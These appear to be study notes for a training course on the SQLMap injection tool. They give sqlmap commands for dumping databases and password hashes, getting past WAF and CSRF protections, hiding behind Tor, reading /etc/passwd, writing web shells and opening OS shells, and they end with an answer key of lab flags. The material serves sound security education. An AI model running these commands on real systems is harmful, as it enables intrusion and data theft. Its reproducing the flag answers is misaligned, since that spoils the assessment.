SQLMap Essentials - Comprehensive Module Documentation

This document serves as a comprehensive guide to the concepts and techniques learned in the HTB Academy "SQLMap Essentials" module. It covers database enumeration, bypassing web application protections, OS exploitation, and the final skills assessment walkthrough.

---

## 1. Introduction to SQLMap

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws, allowing for the retrieval of database contents, bypassing protections, and gaining remote code execution (OS Shell) on the target server.

---

## 2. Database Enumeration

Enumeration is the core of an SQLi attack after vulnerability confirmation. SQLMap uses predefined queries (`queries.xml`) for different DBMSes.

### 2.1 Basic DB Data Enumeration
Use the following flags to retrieve basic information:
*   `--banner`: Database version.
*   `--current-user`: Current DB user.
*   `--current-db`: Current database name.
*   `--is-dba`: Check for administrator privileges (True/False).

Command:
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

2.2 Table Enumeration
Once the current DB is known (e.g., testdb), retrieve table names and dump their contents:

-D testdb: Specify database.
--tables: List tables.
-T users: Specify table.
--dump: Dump table content.
-C name,surname: Specify columns.
--start=2 --stop=3: Retrieve specific row ranges.
--where="name LIKE 'f%'": Conditional enumeration.

Command:
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

Tip: Use --dump-format to change output format (CSV, HTML, SQLite).

2.3 Full DB Enumeration
--dump -D testdb: Dump all tables in a specific DB.
--dump-all: Dump all databases.
--exclude-sysdbs: Skip system databases (recommended).

3. Advanced Database Enumeration

3.1 Schema Enumeration
Retrieve the structure (columns and types) of all tables:
sqlmap -u "http://www.example.com/?id=1" --schema

3.2 Searching for Data
Search for specific tables or columns using --search:
sqlmap -u "http://www.example.com/?id=1" --search -T user
sqlmap -u "http://www.example.com/?id=1" --search -C pass

3.3 Password Enumeration and Cracking
Dump specific tables (e.g., master.users).
SQLMap automatically detects hashes and prompts to crack them using a dictionary-based attack (uses default wordlist.tx_).
--passwords: Dump DBMS user credential hashes and attempt cracking.

4. Bypassing Web Application Protections

4.1 Anti-CSRF Token Bypass
If a token is present, specify it so SQLMap can parse responses and fetch fresh tokens.
--csrf-token="csrf-token": Specify parameter name.

4.2 Unique Value Bypass
Use --randomize to randomize values for specific parameters to prevent blocking.
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp

4.3 Calculated Parameter Bypass
Use --eval to execute Python code before sending the request (e.g., calculating MD5 hashes).
sqlmap -u "http://www.example.com/?id=1&h=..." --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

4.4 IP Address Concealing
Hide your IP address using proxies or Tor.
--proxy: Set a single proxy (e.g., --proxy="socks4://177.39.187.70:33283").
--proxy-file: Use a list of proxies.
--tor: Use Tor network (port 9050/9150).
--check-tor: Verify Tor connectivity.

4.5 WAF Bypass
--skip-waf: Skip heuristical WAF detection (reduce noise).
User-Agent Blacklisting: Use --random-agent to change the default UA to a random browser UA.
Tamper Scripts: Modify requests to bypass filters (e.g., --tamper=between replaces > with NOT BETWEEN 0 AND #).

Miscellaneous:
--chunked: Use Chunked transfer encoding.
HTTP Parameter Pollution (HPP): Split payloads across multiple same-named parameters.

5. OS Exploitation

5.1 File Read/Write
Requires DBA privileges.
Check privileges: --is-dba
Reading Files: --file-read "/etc/passwd"
Writing Files: --file-write "shell.php" --file-dest "/var/www/html/shell.php" (used for writing web shells).

5.2 OS Command Execution
Gain an interactive shell:
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
--technique=E: Forces Error-based technique for reliable output retrieval.
SQLMap prompts for language (PHP) and writable directory (usually /var/www/html/).

6. Walkthrough Solutions (Flags)
Here are the answers to the specific lab questions encountered:

Case 1: Basic Enumeration
flag1: HTB{c0n6r47u1a710n5_y0u_kn0w_h0w_70_run_b45ic_5q1m4p_5c4n}
Column with "style": PARAMETER_STYLE
Kimberly user password: Enizoom1609

Case 3: Cookie Value (id)
flag3: HTB{c0k13_m0n5t3r_15_7h1nk1n6_0f_6r475}

Case 4: JSON Data
flag4: HTB{450n_v00rh335_53nd5_6r475}

Case 6: Non-standard Boundaries
flag6: HTB{v1nc3_mcm4h0n_15_4570n15h3d}

Case 7: UNION SQLi with Adjustments
flag7: HTB{un173_7h3_un173d}

Case 8: Anti-CSRF Token
flag8: HTB{y0u_h4v3_b33n_c5rf_70k3n12d}

Case 9: Unique ID
flag9: HTB{700_much_r4nd0mn355_1d0r_my_74573}

Case 10: Primitive Protection
flag10: HTB{y37_4n07h3r_4n0dm0113}

Case 11: Filtering of Characters
flag11: HTB{5p3c14l_ch4r5_n0_m0r3}

OS Exploitation
Reading /var/www/html/flag.txt: HTB{5up3r_u53r5_4r3_p0w3rfu11}
OS Shell / DB Flag: HTB{n3v3r_run_db_45_db4}

Skills Assessment (Final Flag)
Method: Manually find POST request in Burp Suite (Catalog -> Shop), save request, run sqlmap -r req.txt --batch --dump -T final_flag.
final_flag: HTB{n07_50_h4rd_r16h7??}
